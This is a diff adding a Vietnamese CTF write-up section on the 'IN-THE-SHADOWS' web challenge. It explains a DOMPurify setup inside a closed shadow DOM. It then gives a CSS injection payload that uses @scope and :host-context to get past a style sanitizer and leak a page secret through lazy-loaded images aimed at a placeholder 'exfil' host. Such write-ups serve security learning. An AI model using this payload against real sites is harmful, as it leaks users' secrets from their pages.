@@ -687,4 +687,121 @@ Và khi report `exploit.html` cho bot thì ta sẽ có flag thông qua thông b�
 
 ![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/253ff2fc-d054-4e7f-b468-507b851566b3)
 
-## IN-THE-SHADOWS (To be updated...)
+## IN-THE-SHADOWS 
+
+Goal của bài là ta cần tìm cách truy cập được vào endpoint `check-secret` cùng với một admin secret hợp lệ nhằm có được flag. Ta thấy secret được render trong body, tuy nhiên admin secret thì chỉ được render nếu ta có được admin cookie hợp lệ
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/838d4472-c3cd-48c8-8248-942b4d7094c9)
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/2297f97c-08c1-46c0-aff3-bea9025c830b)
+
+
+Ở bài này ta sẽ có thể nhập vào một nội dung bất kì, sau đó nội dung này sẽ được đưa vào một shadow DOM được attach với một custom element là `UntrustedContentElement`.
+
+```js
+class UntrustedContentElement extends HTMLElement {
+  static get observedAttributes() {
+    return ["html"];
+  }
+
+  constructor() {
+    super();
+    this._shadow = this.attachShadow({ mode: "closed" });
+  }
+
+  get html() {
+    return this.getAttribute("html") ?? "";
+  }
+
+  set html(val) {
+    this.setAttribute("html", val);
+  }
+
+  attributeChangedCallback(name, oldValue, newValue) {
+    if (name === "html") {
+      this._shadow.replaceChildren(sanitize(newValue));
+    }
+  }
+}
+
+customElements.define("untrusted-content", UntrustedContentElement);
+```
+
+Trước khi nội dung được đưa vào shadow DOM thì nó sẽ đi qua DOMPurify, config của DOMPurify như sau:
+```js
+const DOMPURIFY_CONFIG = {
+  RETURN_DOM_FRAGMENT: true,
+  FORCE_BODY: true,
+  FORBID_ATTR: ["name", "id"],
+  FORBID_TAGS: ["template", "svg", "math", "xmp", "textarea"],
+  USE_PROFILES: { html: true },
+};
+```
+
+Ta có 2 phần cần chú ý:
+- `FORBID_ATTR: ["name", "id"]` chặn các attribute như `id`, `name`
+- `FORBID_TAGS: ["template", "svg", "math", "xmp", "textarea"]` chặn các tag `template`, `svg`, `math`, `xmp`, `textarea`, hầu như là các tag dùng trong mutation XSS
+
+Đồng thời author cũng setup một hook cho DOMPurify để handle các `style` element:
+
+```js
+DOMPurify.addHook("uponSanitizeElement", (node, data) => {
+  if (data.tagName === "style") {
+    node.textContent = sanitizeStyleSheet(node.textContent);
+  }
+});
+```
+
+Đối với `style` element thì:
+- không được chứa `@import` hoặc `url(`
+- Sau khi parser bằng `CSSStyleSheet`, không được dùng các rules: import, media, font face, @layer, ...
+- Trong phần selector của rule không được sử dụng `:`
+
+Ở bài này thì mình thấy có khá nhiều hướng giải, mình sẽ trình bày về 1 hướng unintended và hướng intended
+
+### Unintended - lazy loading
+
+Trước khi nhìn vào writeup thì đây cũng là hướng mình dùng, ta có thể chèn tag `img` vào, cho nó lazy load, ẩn nó đi với `style="display: none"` và khi một rule dùng để exfiltrate thỏa điều kiện, ta sẽ set lại style cho `img` đó thành `display: block !important`. Vậy làm sao để select đến `body` từ bên trong shadow DOM? Ta có thể dùng `:host-context` (https://developer.mozilla.org/en-US/docs/Web/CSS/:host-context) để select đến tag `body` và exfiltrate từ từ bằng cách filter theo attribute (`:host-context(body[secret^="0"])`), nhưng có một vấn đề đó là ta sẽ không thể dùng dấu `:` trong selector. Theo như solution của **@rebane2001**, khi dùng `@scope(:host-context(body[secret^="0"]))` thì `rule.selectorText` sẽ là `undefined`
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/98b83fd5-bf2c-4d85-87d7-1b79c7071f3a)
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/73034a57-bf9a-4748-88ba-01ef6499dea2)
+
+Từ đó ta bypass được hàm `shouldDeleteRule`, exploit sẽ như sau:
+
+```html
+<style>
+.hide {
+	display: none;
+}
+
+@scope(:host-context(body[secret^="0"])) {
+	.exfil0 { display: block !important; }
+
+}
+
+@scope(:host-context(body[secret^="1"])) {
+	.exfil1 { display: block !important; }
+
+}
+
+@scope(:host-context(body[secret^="00"])) {
+	.exfil00 { display: block !important; }
+
+}
+
+...
+
+</style>
+
+<img src="http://exfil/0.jpg" class="hide exfil0" loading="lazy">
+<img src="http://exfil/1.jpg" class="hide exfil1" loading="lazy">
+<img src="http://exfil/00.jpg" class="hide exfil00" loading="lazy">
+
+...
+
+```
+
+### Intended - Chromium bug 
+
+Phần này chắc mình sẽ reference đến writeup của tác giả do ~mình lười~ nó cũng đã khá đầy đủ: https://github.com/google/google-ctf/tree/main/2024/quals/web-in-the-shadows
